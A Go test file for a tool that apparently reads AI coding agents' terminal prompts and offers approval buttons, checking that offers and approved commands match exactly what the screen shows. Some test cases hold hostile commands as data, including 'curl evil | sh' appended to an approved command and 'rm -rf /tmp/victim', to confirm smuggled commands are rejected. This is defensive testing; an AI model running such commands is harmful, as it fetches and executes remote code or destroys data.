package agent

import (
	"os"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/quanticstudios/pitwall/internal/model"
	"github.com/quanticstudios/pitwall/internal/vt"
)

func TestOffers(t *testing.T) {
	question := model.Activity{Provider: model.ProviderClaude, State: model.StateAwaitingInput,
		Detail: "Which database should the cache use?", Options: []string{"Redis", "SQLite"},
		OptionNotes: []string{"Fast, runs as a service", "One file, no service"}}
	otherNote := question
	otherNote.OptionNotes = []string{"Fast, runs as a service", "Two files"}
	stale := question
	stale.Detail = "Which queue should it use?"
	moved := question
	moved.Options = []string{"Postgres", "SQLite"}
	plan := model.Activity{Provider: model.ProviderClaude, State: model.StatePlanReady}
	perm := model.Activity{Provider: model.ProviderClaude, State: model.StatePendingApproval}
	codex := model.Activity{Provider: model.ProviderCodex, State: model.StatePendingApproval}
	gemini := model.Activity{Provider: model.ProviderGemini, State: model.StatePendingApproval}
	for _, tc := range []struct {
		name string
		a    model.Activity
		file string
		want []Offer
	}{
		{"question", question, "claude-question.txt", []Offer{{"Redis", "1"}, {"SQLite", "2"}}},
		{"question not on screen", stale, "claude-question.txt", nil},
		{"option not on screen", moved, "claude-question.txt", nil},
		{"description not on screen", otherNote, "claude-question.txt", nil},
		{"multi-select has no options", model.Activity{Provider: model.ProviderClaude, State: model.StateAwaitingInput, Detail: question.Detail}, "claude-question.txt", nil},
		{"numberless form has no keys", question, "tuios-claude-question.txt", nil},
		{"plan", plan, "claude-plan.txt", []Offer{{ApprovePlan, "3"}}},
		{"plan on a permission screen", plan, "claude-permission.txt", nil},
		{"permission", perm, "claude-permission.txt", []Offer{{AllowAlways, "2"}}},
		{"permission on a plan screen", perm, "claude-plan.txt", nil},
		{"permission on an idle screen", perm, "claude-idle.txt", nil},
		{"codex permission", codex, "tuios-codex-approval.txt", []Offer{{AllowAlways, "A"}}},
		{"codex trust dialog", codex, "codex-trust.txt", nil},
		{"no keys for gemini", gemini, "claude-permission.txt", nil},
	} {
		if got := Offers(tc.a, screenFixture(t, tc.file)); !slices.Equal(got, tc.want) {
			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
		}
	}
}

func TestEmptyPlan(t *testing.T) {
	g := screenFixture(t, "claude-empty-plan.txt")
	if got := ReadScreen(g); got != ScreenForm {
		t.Errorf("screen = %d, want form", got)
	}
	if got := StateOf(model.ProviderClaude, g); got != model.StatePlanReady {
		t.Errorf("state = %q, want plan-ready", got)
	}
	if !FormUp(g, "1. Yes, and use auto mode\n2. No") {
		t.Error("empty plan must hold typed text")
	}
	if got := Offers(model.Activity{Provider: model.ProviderClaude, State: model.StatePlanReady}, g); got != nil {
		t.Errorf("auto mode has offers: %v", got)
	}
	for _, text := range []string{
		"I will exit plan mode after writing the plan.",
		"⏺ The dialog says Claude wants to exit plan mode.",
		"When Claude wants to exit plan mode it calls ExitPlanMode.",
		"The dialog asks Exit plan mode? before continuing.",
	} {
		chat := gridOf(text, "❯ ")
		for _, provider := range []model.Provider{model.ProviderClaude, model.ProviderCodex, model.ProviderPi} {
			if ReadScreen(chat) != ScreenNone || StateOf(provider, chat) != "" || FormUp(chat, "") {
				t.Errorf("%s: chat text matches the empty plan screen: %q", provider, text)
			}
		}
	}
}

func TestEmptyPlanTitles(t *testing.T) {
	for _, title := range []string{
		"Exit plan mode? · from a subagent",
		"Exit plan mode? · from the planner agent",
		"Exit plan mode?                                         2 of 2",
	} {
		t.Run(title, func(t *testing.T) {
			g := gridOf(title, "", "Claude wants to exit plan mode", "",
				"❯ 1. Yes, and use auto mode", "  2. No")
			if ReadScreen(g) != ScreenForm || StateOf(model.ProviderClaude, g) != model.StatePlanReady {
				t.Fatal("empty plan is not waiting")
			}
			trace := ExplainScreen(model.ProviderClaude, g)
			if trace.Rule != "plan/claude wants to exit plan mode" {
				t.Fatalf("rule = %q", trace.Rule)
			}
			if got := Offers(model.Activity{Provider: model.ProviderClaude, State: model.StatePlanReady}, g); got != nil {
				t.Errorf("auto mode has offers: %v", got)
			}
		})
	}
}

func TestEmptyPlanNarrow(t *testing.T) {
	b, err := os.ReadFile("testdata/claude-empty-plan.txt")
	if err != nil {
		t.Fatal(err)
	}
	for _, width := range []int{20, 28, 29, 30, 40, 100} {
		e := vt.New(width, 30, nil)
		e.Write([]byte(strings.ReplaceAll(string(b), "\n", "\r\n")))
		g := e.Snapshot()
		if ReadScreen(g) != ScreenForm || State(g) != model.StatePlanReady || !FormUp(g, "") {
			t.Errorf("width %d: empty plan is not waiting", width)
		}
	}
}

// The plan's other yeses raise the permission mode, and two ways to say
// always are a guess, so neither gets a button.
func TestOffersAmbiguous(t *testing.T) {
	perm := model.Activity{Provider: model.ProviderCodex, State: model.StatePendingApproval}
	if got := Offers(perm, gridOf("Would you like to run the following command?", "› 1. Yes, proceed (y)",
		"  2. Yes, and don't ask again for this command (a)", "  3. Yes, and don't ask again for commands that start with `go` (p)", "esc to cancel")); got != nil {
		t.Errorf("two always options: %v", got)
	}
	plan := model.Activity{Provider: model.ProviderClaude, State: model.StatePlanReady}
	if got := Offers(plan, gridOf("Would you like to proceed?", "❯ 1. Yes, and use auto mode", "  2. Yes, auto-accept edits", "  3. No, keep planning")); got != nil {
		t.Errorf("no manual yes: %v", got)
	}
}

// A form that starts like the asked one is another form: the whole question
// and every option must match, however they wrap.
func TestOffersWholeForm(t *testing.T) {
	q := func(detail string, options ...string) model.Activity {
		return model.Activity{Provider: model.ProviderClaude, State: model.StateAwaitingInput, Detail: detail, Options: options}
	}
	long := "Do you want me to remove all the cached build files and deployment artifacts belonging to account "
	footer := "Enter to select · Esc to cancel"
	for _, tc := range []struct {
		name string
		a    model.Activity
		g    vt.Grid
		want int
	}{
		{"exact", q("Which?", "Yes", "No"), gridOf("☐ Pick", "", "Which?", "", "> 1. Yes", "  2. No", footer), 2},
		{"wrapped question", q(long+"staging?", "Yes", "No"), gridOf(long[:60], long[60:]+"staging?", "> 1. Yes", "  2. No", footer), 2},
		{"wrapped option", q("Where?", "Deploy release to staging now", "Cancel"), gridOf("Where?", "> 1. Deploy release to", "     staging now", "  2. Cancel", footer), 2},
		{"question with the same start", q(long+"staging?", "Yes", "No"), gridOf(long+"production?", "> 1. Yes", "  2. No", footer), 0},
		{"question with the same end", q("delete staging?", "Yes", "No"), gridOf("do not delete staging?", "> 1. Yes", "  2. No", footer), 0},
		{"same end across a wrap", q("delete staging?", "Yes", "No"), gridOf("do not", "delete staging?", "> 1. Yes", "  2. No", footer), 0},
		{"a paragraph more", q("Which?", "Yes", "No"), gridOf("First read this.", "", "Which?", "> 1. Yes", "  2. No", footer), 0},
		{"wrapped option differs", q("Where?", "Deploy release to staging", "Cancel"), gridOf("Where?", "> 1. Deploy release to", "     production", "  2. Cancel", footer), 0},
		{"option longer on screen", q("Where?", "Deploy release to", "Cancel"), gridOf("Where?", "> 1. Deploy release to", "     production", "  2. Cancel", footer), 0},
		{"question scrolled off", q(long+"staging?", "Yes", "No"), gridOf("staging?", "> 1. Yes", "  2. No", footer), 0},
		{"more after a blank row", q("Where?", "Deploy to staging", "Cancel"), gridOf("Where?", "> 1. Deploy to staging", "", "     and production", "  2. Cancel", footer), 0},
		{"more that reads like a footer", q("Where?", "Deploy to staging", "Cancel"), gridOf("Where?", "> 1. Deploy to staging", "     Enter to select production too", "  2. Cancel", footer), 0},
		{"last option with more", q("Where?", "Deploy", "Cancel"), gridOf("Where?", "> 1. Deploy", "  2. Cancel", "", "     everything", footer), 0},
		{"last option with no footer", q("Where?", "Deploy", "Cancel"), gridOf("Where?", "> 1. Deploy", "  2. Cancel", "Press enter to confirm"), 0},
	} {
		if got := Offers(tc.a, tc.g); len(got) != tc.want {
			t.Errorf("%s: got %v, want %d offers", tc.name, got, tc.want)
		}
	}
}

// FormUp holds typed text and Enter for any form but a free-text one, and does
// not take a quote of a footer, a transcript's list or the paste's own echo for
// one.
func TestFormUp(t *testing.T) {
	for _, file := range []string{"claude-question.txt", "claude-plan.txt", "claude-permission.txt", "tuios-claude-question.txt", "tuios-codex-approval.txt", "codex-trust.txt", "gemini-question.txt", "opencode-question.txt"} {
		if !FormUp(screenFixture(t, file), "") {
			t.Errorf("%s: no form", file)
		}
	}
	for _, file := range []string{"claude-idle.txt", "codex-idle.txt", "claude-streaming.txt", "common-input.txt"} {
		if FormUp(screenFixture(t, file), "") {
			t.Errorf("%s: a form", file)
		}
	}
	menu := gridOf("Which?", "> 1. Redis", "  2. SQLite", "Press enter to confirm or esc to cancel")
	for _, tc := range []struct {
		name   string
		g      vt.Grid
		pasted string
		want   bool
	}{
		{"menu with another footer", menu, "", true},
		{"menu after a paste", menu, "Use Postgres", true},
		{"footer quoted in output", gridOf("The menu says Enter to select", "> "), "", false},
		{"numbered prompt in the transcript", gridOf("❯ 1. fix a", "  2. fix b", "⏺ Done", "❯ "), "", false},
		{"numbered paste at the prompt", gridOf("❯ 1. do a", "  2. do b"), "1. do a\n2. do b", false},
		{"menu after a numbered paste", gridOf("❯ 1. Redis", "  2. SQLite"), "1. do a\n2. do b", true},
		{"menu whose option the paste names", gridOf("❯ 1. Postgres", "  2. SQLite"), "Use Postgres", true},
	} {
		if got := FormUp(tc.g, tc.pasted); got != tc.want {
			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
		}
	}
}

func TestChoosing(t *testing.T) {
	for file, want := range map[string]bool{
		"claude-question.txt":       true,
		"tuios-claude-question.txt": true,
		"opencode-question.txt":     true,
		"gemini-question.txt":       true,
		"common-input.txt":          false, // a free-text form
		"claude-idle.txt":           false,
		"codex-idle.txt":            false,
		"claude-streaming.txt":      false,
	} {
		if got := Choosing(screenFixture(t, file)); got != want {
			t.Errorf("%s: got %v, want %v", file, got, want)
		}
	}
}

// A hook's AskUserQuestion names its options when it asks one single-choice
// question; a later event takes them back.
func TestDeriveOptions(t *testing.T) {
	now := time.Now()
	b, err := os.ReadFile("testdata/claude_ask_user_question.json")
	if err != nil {
		t.Fatal(err)
	}
	if a, ok := Derive(nil, model.ProviderClaude, b, now); !ok || a.Options != nil {
		t.Errorf("two questions: %+v", a)
	}
	one := `{"hook_event_name":"PreToolUse","tool_name":"AskUserQuestion","tool_input":{"questions":[` +
		`{"question":"Which?","multiSelect":false,"options":[{"label":" Redis  cache ","description":"d"},{"label":"SQLite"}]}]}}`
	a, ok := Derive(nil, model.ProviderClaude, []byte(one), now)
	if !ok || a.State != model.StateAwaitingInput || !slices.Equal(a.Options, []string{"Redis cache", "SQLite"}) || !slices.Equal(a.OptionNotes, []string{"d", ""}) || !a.Menu {
		t.Fatalf("one question: %+v", a)
	}
	a.Buttons = a.Options
	next, ok := Derive(&a, model.ProviderClaude, []byte(`{"hook_event_name":"PostToolUse","tool_name":"AskUserQuestion"}`), now)
	if !ok || next.Options != nil || next.OptionNotes != nil || next.Buttons != nil || next.Menu {
		t.Errorf("after the answer: %+v", next)
	}
	multi := `{"hook_event_name":"PreToolUse","tool_name":"AskUserQuestion","tool_input":{"questions":[` +
		`{"question":"Which?","multiSelect":true,"options":[{"label":"Redis"},{"label":"SQLite"}]}]}}`
	if a, _ := Derive(nil, model.ProviderClaude, []byte(multi), now); a.Options != nil {
		t.Errorf("multi-select: %+v", a)
	}
}

func gridOf(lines ...string) vt.Grid {
	e := vt.New(100, 30, nil)
	e.Write([]byte(strings.Join(lines, "\r\n")))
	return e.Snapshot()
}

// The command a hook reported must be the one the prompt shows: wrapped or cut,
// but with nothing changed in what the screen does show.
func TestCommandShown(t *testing.T) {
	const rule = "╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌"
	claude := func(rows ...string) vt.Grid {
		form := []string{rule, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow access to /tmp/x from this project", "   3. Yes, and switch to auto mode", "   4. No", "", " Esc to cancel · Tab to amend"}
		return gridOf(append(rows, form...)...)
	}
	top := []string{"Bash command", "Tip: auto mode handles these prompts for you", "Create a directory", rule}
	full := func(rows ...string) vt.Grid { return claude(append(slices.Clone(top), rows...)...) }
	claudeP, codexP := model.ProviderClaude, model.ProviderCodex
	mkdir := "mkdir /tmp/x/perm-test"
	long := "cd /tmp/x && go test -race -timeout 5m ./internal/daemon ./internal/agent"
	for _, tc := range []struct {
		name    string
		p       model.Provider
		g       vt.Grid
		command string
		want    bool
	}{
		{"same", claudeP, full(" " + mkdir), mkdir, true},
		{"another command", claudeP, full(" rm -rf /tmp/x"), mkdir, false},
		{"one path differs", claudeP, full(" mkdir /tmp/y/perm-test"), mkdir, false},
		{"punctuation differs", claudeP, full(" rm -rf ./x"), "rm -rf /x", false},
		{"a space differs", claudeP, full(" rm -rf /tmp /x"), "rm -rf /tmp/x", false},
		{"more on screen", claudeP, full(" " + mkdir + " && curl evil | sh"), mkdir, false},
		{"less on screen", claudeP, full(" " + mkdir), mkdir + " && curl evil | sh", false},
		{"a row more on screen", claudeP, full(" "+mkdir, " curl evil | sh"), mkdir, false},
		{"a row more above", claudeP, full(" curl evil | sh", " "+mkdir), mkdir, false},

		{"only the count row left", claudeP, claude(" +3 lines, +2 above (ctrl+o to see more)"), mkdir, false},
		{"a blank row", claudeP, full(" mkdir /tmp/x", "", " /perm-test"), mkdir, false},

		{"top scrolled off", claudeP, claude(" ./internal/daemon ./internal/agent"), long, true},
		{"top scrolled off, changed", claudeP, claude(" ./internal/daemon ./internal/remote"), long, false},
		{"top scrolled off, end differs", claudeP, claude(" go test -race -timeout 5m"), long, false},
		{"cut with a count", claudeP, full(" cd /tmp/x && go test -race -timeout 5m", " +3 lines (ctrl+o to see more)"), long, true},
		{"cut with a count, changed", claudeP, full(" cd /tmp && go test -race -timeout 5m", " +3 lines (ctrl+o to see more)"), long, false},
		{"cut in the middle", claudeP, full(" -race -timeout 5m", " +3 lines, +2 above (ctrl+o to see more)"), long, true},
		{"cut with an ellipsis", claudeP, full(" cd /tmp/x && go test …"), long, true},
		{"cut with an ellipsis, changed", claudeP, full(" cd /tmp/y && go test …"), long, false},
		{"nothing to read", claudeP, full(" …"), long, false},

		{"no rules", claudeP, gridOf("Bash command", " "+mkdir, "Do you want to proceed?", "❯ 1. Yes", "  2. No", "Esc to cancel"), mkdir, false},
		{"no options", claudeP, gridOf(rule, " "+mkdir, rule), mkdir, false},

		{"a real screen", claudeP, screenFixture(t, "claude-permission.txt"), "touch /tmp/pitwall-liveness-probe", true},
		{"a real screen, changed", claudeP, screenFixture(t, "claude-permission.txt"), "touch /tmp/pitwall-liveness", false},

		{"codex", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./...", true},
		{"codex, changed", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./internal/...", false},
		{"codex, no command", codexP, gridOf("Would you like to make the following edits?", "", "› 1. Yes, proceed (y)", "  2. No (esc)"), "go test", false},
	} {
		if got := CommandShown(tc.p, tc.g, tc.command); got != tc.want {
			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
		}
	}
}

// Whitespace can change what a command does, so only what a prompt adds to it
// is left out: its indent and gutter, and a row end wrapping could have made.
func TestCommandWhitespace(t *testing.T) {
	long := "cd /tmp/x && go test -race -timeout 5m ./internal/daemon ./internal/agent"
	for _, tc := range []struct {
		name    string
		cols    int
		rows    []string
		command string
		want    bool
	}{
		{"same", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep  safe'", true},
		{"a quoted space less", 100, []string{" rm -- '/tmp/keep safe'"}, "rm -- '/tmp/keep  safe'", false},
		{"a quoted space more", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep safe'", false},
		{"a tab, drawn as spaces", 100, []string{" printf 'a    b'"}, "printf 'a\tb'", false},
		{"a tab, not drawn", 100, []string{" mkdir '/tmp/ab'"}, "mkdir '/tmp/a\tb'", false},
		{"a trailing newline", 100, []string{" echo safe"}, "echo safe\n", true},

		{"wrapped between words", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"}, long, true},
		{"wrapped with a space on the next row", 48, []string{" cd /tmp/x && go test -race -timeout 5m", "  ./internal/daemon ./internal/agent"}, long, true},
		{"wrapped inside a word", 48, []string{" cd /tmp/x && go test -race -timeout 5m ./inter", " nal/daemon ./internal/agent"}, long, true},
		{"wrapped and changed", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/remote"}, long, false},
		{"a newline on screen, where the word would fit", 100, []string{" echo safe", " rm -rf /tmp/victim"}, "echo safe rm -rf /tmp/victim", false},
		{"a newline on screen, inside a short row", 100, []string{" rm -rf /tmp", " /x"}, "rm -rf /tmp/x", false},
		{"a newline at the pane's edge looks like a wrap", 14, []string{" echo safe", " rm -rf /tmp"}, "echo safe rm -rf /tmp", true},

		{"a space more before the row end", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"}, strings.Replace(long, " ./internal/daemon", "  ./internal/daemon", 1), false},
		{"a space more after the row end", 48, []string{" cd /tmp/x && go test -race -timeout 5m", "   ./internal/daemon ./internal/agent"}, long, false},

		{"a multi-line command", 100, []string{" echo safe", " rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", false},
		{"a newline only in the command", 100, []string{" echo safe rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", false},
		{"a newline off screen", 100, []string{" echo safe"}, "rm -rf /tmp/victim\necho safe", false},
		{"a tab off screen", 100, []string{" echo safe", " +3 lines (ctrl+o to see more)"}, "echo safe\tb", false},
	} {
		e := vt.New(tc.cols, 30, nil)
		form := append([]string{"╌╌╌"}, tc.rows...)
		form = append(form, "╌╌╌", " Do you want to proceed?", " ❯ 1. Yes", "   2. No")
		e.Write([]byte(strings.Join(form, "\r\n")))
		if got := CommandShown(model.ProviderClaude, e.Snapshot(), tc.command); got != tc.want {
			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
		}
	}
	// A wrapped row is measured in cells: these rows are full, in half as many runes.
	six, eight := strings.Repeat("界", 6), strings.Repeat("界", 8)
	for _, tc := range []struct {
		name, command string
		rows          []string
	}{
		{"cut inside a word", "echo " + strings.Repeat("界", 20) + "/x", []string{" echo " + strings.Repeat("界", 20) + "/x"}},
		{"moved between words", "echo " + six + " " + eight, []string{" echo " + six, " " + eight}},
	} {
		e := vt.New(30, 30, nil)
		e.Write([]byte(strings.Join(append(append([]string{"╌╌╌"}, tc.rows...), "╌╌╌", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), "\r\n")))
		if !CommandShown(model.ProviderClaude, e.Snapshot(), tc.command) {
			t.Errorf("wide, %s: not shown", tc.name)
		}
	}
	e := vt.New(40, 30, nil)
	e.Write([]byte(strings.Join([]string{"  $ go test -race -timeout 5m ./internal", "    /agent", "", "› 1. Yes, proceed (y)", "  2. No (esc)"}, "\r\n")))
	if !CommandShown(model.ProviderCodex, e.Snapshot(), "go test -race -timeout 5m ./internal/agent") {
		t.Error("codex, wrapped: not shown")
	}
}

// Only a Bash permission request carries a command to compare; another request
// says the last command no longer applies, and other events say nothing.
func TestAskedCommand(t *testing.T) {
	for _, tc := range []struct {
		payload string
		command string
		ok      bool
	}{
		{`{"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"git push"}}`, "git push", true},
		{`{"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":["git","push"]}}`, "", true},
		{`{"hook_event_name":"PermissionRequest","tool_name":"apply_patch","tool_input":{"command":"*** Begin Patch"}}`, "", true},
		{`{"hook_event_name":"PermissionRequest","tool_name":"Edit","tool_input":{"file_path":"a.go"}}`, "", true},
		{`{"hook_event_name":"PermissionRequest","tool_name":"ExitPlanMode","tool_input":{}}`, "", false},
		{`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git push"}}`, "", false},
		{`{"hook_event_name":"Notification","notification_type":"permission_prompt"}`, "", false},
		{`{"hook_event_name":"PermissionRequest","transcript_path":null,"tool_name":"Bash","tool_input":{"command":"git push"}}`, "", false},
	} {
		if command, ok := AskedCommand([]byte(tc.payload)); command != tc.command || ok != tc.ok {
			t.Errorf("%s: got %q %v", tc.payload, command, ok)
		}
	}
}
